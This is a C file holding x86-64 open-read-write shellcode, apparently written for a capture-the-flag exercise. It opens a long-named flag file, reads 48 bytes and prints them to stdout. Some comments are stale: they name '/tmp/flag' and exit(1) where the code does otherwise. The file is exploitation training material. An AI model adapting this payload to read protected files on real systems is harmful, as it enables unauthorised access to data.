// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x0\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n"
    "push rax\n"
	"mov rax, 0x6c5f73695f656d61\n"
    "push rax\n"
	"mov rax, 0x6e5f67616c662f63\n"
    "push rax\n"
	"mov rax, 0x697361625f6c6c65\n"
    "push rax\n"
	"mov rax, 0x68732f656d6f682f\n"
    "push rax\n"

    "mov rdi, rsp # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"

    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"

    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c   # rax = sys_exit\n"
    "syscall   # exit(1)");

void run_sh();

int main() { run_sh(); }